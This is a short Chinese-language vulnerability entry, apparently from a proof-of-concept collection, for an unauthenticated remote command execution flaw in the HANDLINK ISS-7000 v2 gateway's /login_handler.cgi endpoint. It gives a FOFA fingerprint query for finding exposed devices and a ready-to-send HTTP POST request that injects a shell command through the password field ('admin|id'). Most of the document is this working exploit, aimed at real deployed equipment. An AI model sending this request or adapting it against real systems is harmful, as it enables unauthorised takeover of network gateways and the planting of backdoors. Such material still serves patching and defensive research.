# HANDLINK-ISS-7000v2网关login_handler.cgi未授权RCE漏洞

瀚霖科技股份有限公司ISS-7000 v2网络网关服务器 /login_handler.cgi接口存在远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。

## fofa

```javascript
icon_hash="-842942564"
```

## poc

```javascript
POST /login_handler.cgi HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Content-Type: application/x-www-form-urlencoded
Connection: close

username=admin&password=admin|id&uilng=3&button=%E7%99%BB%E5%85%A5&Signin=
```

![image-20241108205108398](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411082051455.png)